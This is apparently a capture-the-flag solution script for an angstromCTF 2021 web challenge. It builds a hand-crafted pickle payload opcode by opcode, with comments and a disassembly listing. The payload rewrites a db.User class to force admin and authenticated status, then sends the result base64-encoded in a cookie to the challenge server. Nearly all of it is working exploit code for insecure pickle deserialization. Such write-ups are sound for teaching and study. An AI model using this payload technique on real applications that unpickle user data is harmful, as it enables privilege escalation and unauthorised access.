#!/usr/bin/env python3

import base64
import requests
from pickle import BININT1, BININT2, BUILD, DEFAULT_PROTOCOL, EMPTY_DICT, EMPTY_TUPLE, NEWFALSE, NEWOBJ, NEWTRUE, NONE, POP, PROTO, FRAME, MARK, REDUCE, SETITEM, SETITEMS, SHORT_BINBYTES, SHORT_BINUNICODE, STACK_GLOBAL, STOP, TUPLE, TUPLE1, TUPLE2, dumps
from struct import pack

def pickle_bytes(obj):
    return pack("<B", len(obj)) + obj

def pickle_short_str(obj):
    encoded = obj.encode("utf-8", "surrogatepass")
    return pickle_bytes(encoded)

def frame(fn):
    frame_bytes = bytearray()

    def op(target, data):
        target += data

    fn(lambda data: op(frame_bytes, data))

    frame_size = len(frame_bytes)

    data = bytearray()
    op(data, FRAME + pack("<Q", frame_size))
    data += frame_bytes
    op(data, STOP)

    return data

def main(op):
    # create an instance of db.User
    # SHORT_BINUNICODE: Push a Python Unicode string object.
    # STACK_GLOBAL: take the two topmost stack items module_name and qualname, and push the result of looking up the dotted qualname in the module named module_name.
    # EMPTY_TUPLE: Push an empty tuple.
    # REDUCE: Push an object built from a callable and an argument tuple.

    op(SHORT_BINUNICODE + pickle_short_str("db"))
    op(SHORT_BINUNICODE + pickle_short_str("User"))
    op(STACK_GLOBAL)
    op(EMPTY_TUPLE)
    op(REDUCE)

    # set admin = False using the BUILD opcode
    # the second time this is unpickled, db.User.__setstate__ will be set,
    # which short-circuits BUILD such that admin isn't set to False
    # None: Push None on the stack.
    # EMPTY_DICT: Push an empty dict.
    op(NONE)
    op(EMPTY_DICT)

    # NEWFALSE: Push False onto the stack.
    # SETITEM: Add a key+value pair to an existing dict.
    # TUPLE2: Build a two-tuple out of the top two items on the stack.
    # BUILD: Finish building an object, via setstate or dict update.

    op(SHORT_BINUNICODE + pickle_short_str("admin"))
    op(NEWFALSE)
    op(SETITEM)
    op(TUPLE2)
    op(BUILD)

    # put the db.User type on the stack
    op(SHORT_BINUNICODE + pickle_short_str("db"))
    op(SHORT_BINUNICODE + pickle_short_str("User"))
    op(STACK_GLOBAL)

    # update db.User.admin = True, db.User.authenticated = db.User, db.User.__setstate__ = db.User
    # by setting these methods to db.User, it will return an instance of db.User, which is truthy
    # MARK: Push markobject onto the stack.
    op(NONE)
    op(EMPTY_DICT)
    op(MARK)

    # NEWTRUE: Push True onto the stack.
    op(SHORT_BINUNICODE + pickle_short_str("admin"))
    op(NEWTRUE)

    op(SHORT_BINUNICODE + pickle_short_str("authenticated"))
    op(SHORT_BINUNICODE + pickle_short_str("db"))
    op(SHORT_BINUNICODE + pickle_short_str("User"))
    op(STACK_GLOBAL)

    op(SHORT_BINUNICODE + pickle_short_str("__setstate__"))
    op(SHORT_BINUNICODE + pickle_short_str("db"))
    op(SHORT_BINUNICODE + pickle_short_str("User"))
    op(STACK_GLOBAL)

    # SETITEMS: Add an arbitrary number of key+value pairs to an existing dict.
    op(SETITEMS)
    op(TUPLE2)
    op(BUILD)

    # the BUILD opcode keeps the db.User type on the stack, which we no longer need
    # we want the db.User we constructed earlier to be at the top of the stack
    # POP: Discard the top stack item, shrinking the stack by one item.
    op(POP)

data = PROTO + pack("<B", DEFAULT_PROTOCOL) + frame(main)

"""
b'\x80\x03\x95g\x00\x00\x00\x00\x00\x00\x00\x8c\x02db\x8c\x04User\x93)RN}\x8c\x05admin\x89s\x86b\x8c\x02db\x8c\x04Us
er\x93N}(\x8c\x05admin\x88\x8c\rauthenticated\x8c\x02db\x8c\x04User\x93\x8c\x0c__setstate__\x8c\x02db\x8c\x04User\x93u\x86b0.'
"""



import pickletools
pickletools.dis(data)

"""
    0: \x80 PROTO      3
    2: \x95 FRAME      103
   11: \x8c SHORT_BINUNICODE 'db'
   15: \x8c SHORT_BINUNICODE 'User'
   21: \x93 STACK_GLOBAL
   22: )    EMPTY_TUPLE
   23: R    REDUCE
   24: N    NONE
   25: }    EMPTY_DICT
   26: \x8c SHORT_BINUNICODE 'admin'
   33: \x89 NEWFALSE
   34: s    SETITEM
   35: \x86 TUPLE2
   36: b    BUILD
   37: \x8c SHORT_BINUNICODE 'db'
   41: \x8c SHORT_BINUNICODE 'User'
   47: \x93 STACK_GLOBAL
   48: N    NONE
   49: }    EMPTY_DICT
   50: (    MARK
   51: \x8c     SHORT_BINUNICODE 'admin'
   58: \x88     NEWTRUE
   59: \x8c     SHORT_BINUNICODE 'authenticated'
   74: \x8c     SHORT_BINUNICODE 'db'
   78: \x8c     SHORT_BINUNICODE 'User'
   84: \x93     STACK_GLOBAL
   85: \x8c     SHORT_BINUNICODE '__setstate__'
   99: \x8c     SHORT_BINUNICODE 'db'
  103: \x8c     SHORT_BINUNICODE 'User'
  109: \x93     STACK_GLOBAL
  110: u        SETITEMS   (MARK at 50)
  111: \x86 TUPLE2
  112: b    BUILD
  113: 0    POP
  114: .    STOP
highest protocol among opcodes = 4
"""

content = base64.b64encode(data).decode()

cookie = {
    'user': content
}

r = requests.get("https://ekans.2021.chall.actf.co/", cookies=cookie)
print(r.text)